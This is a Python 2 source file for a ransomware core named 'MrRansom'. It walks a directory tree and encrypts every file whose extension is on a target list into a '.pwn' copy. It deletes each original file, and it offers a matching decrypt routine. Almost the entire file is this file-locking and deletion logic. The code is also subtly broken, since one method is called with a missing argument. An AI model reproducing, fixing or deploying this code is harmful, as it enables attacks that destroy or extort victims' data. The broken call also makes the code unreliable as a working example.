import json
import os
import time

from file_util import read_chunks, get_file, write_chunk
from aldersonalgorithm import AldersonAlgorithm

ENCRYPT = 'encrypt'

DECRYPT = 'decrypt'

FILE_TYPES_JSON = os.path.join(os.path.dirname(os.path.realpath(__file__)), "file_types.json")

ENCRYPTED_EXTENSION = ".pwn"


def get_target_files(files, mode):
    files_to_process = []
    for file_path in files:
        if should_process(file_path, mode):
            files_to_process.append(file_path)

    return files_to_process


def should_process(file_path, mode):
    return mode == ENCRYPT and can_encrypt_file(file_path) \
           or mode == DECRYPT and can_decrypt_file(file_path)


def can_encrypt_file(filename):
    for file_type in encryptable_file_types():
        if filename.endswith(file_type) and not os.path.basename(filename).startswith("."):
            return True


def can_decrypt_file(file_name):
    if file_name.endswith(ENCRYPTED_EXTENSION):
        return True


def encryptable_file_types():
    types_json = json.loads(get_file(FILE_TYPES_JSON))

    return [file_type for file_type in types_json["fileTypes"]]


def do_nothing(input):
    return input


class MrRansom:

    def __init__(self, key, root_dir):
        self.key = key
        self.algorithm = AldersonAlgorithm(key)
        self.all_files = [os.path.join(root, file_name) for root, directories, file_names in
                          os.walk(root_dir) for file_name in file_names]

    def encrypt(self):
        for file_path in get_target_files(self.all_files, ENCRYPT):
            self.encrypt_file(file_path)

    def decrypt(self):
        for file_path in get_target_files(self.all_files, DECRYPT):
            self.decrypt_file(file_path)

    def encrypt_file(self, file_path):
        start_time = time.time()

        out_file_path = file_path + ENCRYPTED_EXTENSION
        self.algorithm.encrypt(self.get_contents(file_path), out_file_path)

        print "Encrypted '{}' in {}s".format(os.path.basename(file_path), time.time() - start_time)

    def decrypt_file(self, file_path):
        start_time = time.time()

        out_file_path = file_path[:len(file_path) - len(ENCRYPTED_EXTENSION)]
        self.algorithm.decrypt_file(file_path, out_file_path)

        print "Decrypted '{}' in {}s".format(os.path.basename(out_file_path), time.time() - start_time)

    @staticmethod
    def get_contents(in_file_path, process):
        in_file = open(in_file_path, "rb")

        processed = ""
        for chunk in read_chunks(in_file):
            processed += process(chunk)

        in_file.close()

        os.remove(in_file_path)

        return processed
